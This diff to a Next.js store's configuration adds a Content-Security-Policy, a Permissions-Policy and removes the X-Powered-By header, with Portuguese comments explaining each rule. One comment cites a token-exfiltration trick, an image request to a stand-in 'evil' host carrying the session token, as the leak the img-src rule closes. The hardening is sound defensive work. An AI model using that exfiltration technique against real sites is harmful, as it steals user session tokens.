@@ -38,7 +38,54 @@ import type { NextConfig } from 'next';
 const PRODUTOS = process.env.PRODUCT_API ?? 'http://localhost:8081';
 const AUTENTICACAO = process.env.AUTH_API ?? 'http://localhost:8080';
 
+/**
+ * Content-Security-Policy.
+ *
+ * Existe por causa de uma exposição concreta: o token da vendedora fica no
+ * `sessionStorage`, ao alcance de qualquer JavaScript que consiga rodar na
+ * página. A correção de fundo é cookie `HttpOnly`, que depende do backend
+ * emitir o cookie; até lá, isto é o que limita o estrago.
+ *
+ * O que cada linha impede, em ordem de importância:
+ *
+ * - `connect-src 'self'`: mesmo que um script hostil rode, ele não consegue
+ *   mandar o token para fora por `fetch`, `XHR` ou WebSocket;
+ * - `img-src` sem host externo: fecha a saída por `new Image().src = 'evil/?t='`,
+ *   que é como se contorna `connect-src`;
+ * - `object-src 'none'` e `base-uri 'self'`: tiram plugin e sequestro de URL
+ *   relativa da mesa;
+ * - `frame-ancestors 'none'`: mesma proteção do `X-Frame-Options`, na forma que
+ *   os navegadores atuais respeitam.
+ *
+ * **O limite conhecido**: `script-src` precisa de `'unsafe-inline'`. O Next
+ * injeta na página os scripts embutidos que carregam o estado da hidratação, e
+ * sem isso a loja não abre. Resolver de verdade exige nonce por requisição, o
+ * que significa middleware em toda rota. Fica registrado como dívida, e não
+ * como se estivesse resolvido: com `'unsafe-inline'`, a CSP não impede o script
+ * hostil de rodar, ela impede o resultado dele de sair daqui.
+ */
+const POLITICA_DE_CONTEUDO = [
+  "default-src 'self'",
+  "script-src 'self' 'unsafe-inline'",
+  // O Tailwind e o Next injetam estilo embutido; não há host externo envolvido.
+  "style-src 'self' 'unsafe-inline'",
+  // `blob:` é a prévia da foto antes de salvar, no painel; `data:` são os ícones
+  // desenhados em linha.
+  "img-src 'self' data: blob:",
+  "font-src 'self'",
+  "connect-src 'self'",
+  "form-action 'self'",
+  "frame-ancestors 'none'",
+  "base-uri 'self'",
+  "object-src 'none'",
+].join('; ');
+
 const nextConfig: NextConfig = {
+  // O padrão manda `X-Powered-By: Next.js` em toda resposta. Não é uma falha por
+  // si, mas entrega de graça qual pilha e qual versão procurar num boletim de
+  // vulnerabilidade.
+  poweredByHeader: false,
+
   images: {
     // Só imagens do próprio domínio, e só sob /uploads. O padrão local é mais
     // restritivo que o remoto por natureza: não há host de terceiro envolvido.
@@ -75,6 +122,9 @@ const nextConfig: NextConfig = {
           { key: 'X-Content-Type-Options', value: 'nosniff' },
           { key: 'X-Frame-Options', value: 'DENY' },
           { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
+          { key: 'Content-Security-Policy', value: POLITICA_DE_CONTEUDO },
+          // Sem câmera, microfone nem localização em lugar nenhum da loja.
+          { key: 'Permissions-Policy', value: 'camera=(), microphone=(), geolocation=(), payment=()' },
         ],
       },
     ];
